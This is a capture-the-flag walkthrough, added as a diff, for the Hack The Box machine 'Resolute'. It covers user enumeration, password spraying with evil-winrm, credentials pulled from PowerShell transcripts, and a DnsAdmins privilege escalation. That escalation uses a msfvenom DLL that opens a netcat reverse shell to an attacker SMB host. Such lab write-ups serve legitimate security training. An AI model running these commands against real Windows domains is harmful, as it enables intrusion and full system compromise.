@@ -1,0 +1,57 @@
+foothold
+--------
+1) enum4linux the ip 
+/*
+found something under <user on resolute.htb>
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. 
+<Password set to Welcome123!>
+*/
+
+User
+----
+1) now try each user found with the password using evil-winrm since (port 5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)) is available
+
+//evil-winrm -u <username> -p 'Welcome123!' -i 10.10.10.169
+//credential found = melanie:Welcome123!
+2)log in using evil-winrm and grab the userFlag!
+
+Root
+----
+1)as melanie enumerate around and found there's hidden directory at C:\
+//use dir -FORCE to show hidden directory
+
+2)cd into the C:\PSTranscripts\20191203
+//PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt 
+//in the script there's ryan credential Serv3r4Admin4cc123!
+
+3)login into ryan using evil-winrm
+4)checked ryan group and users
+/*
+net user ryan
+whoami /groups
+//ryan is an alias of DnsAdmins group which can be abused
+*/
+5)create dll payload using msfvenom
+//msfvenom -p windows/x64/exec cmd='\\10.10.14.132\test\nc.exe 10.10.14.132 4444 -e cmd.exe' -f dll > ij.dll
+6)place nc.exe in a folder same as the payload
+7)use impacket smbserver.py to share the directory
+//rmb must be in the directory containing the files
+//smbserver.py test $(pwd)
+7.5)create a listener
+//nc -lvnp 4444
+8)now exploit the DnsAdmin 
+/*
+dnscmd resolute /config /serverlevelplugindll \\10.10.14.132\test\ij.dll
+sc.exe \\resolute stop dns
+//after a few second 4-5 to let dns server fully stop
+sc.exe \\resolute start dns
+*/
+9)now the local netcat will get the reverse shell, so go grab the rootFlag!!
+
+tips
+----
+//check payload placed well in it or not
+reg query \\Resolute\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+
+//execute dll for testing
+regsvr32 test.dll 
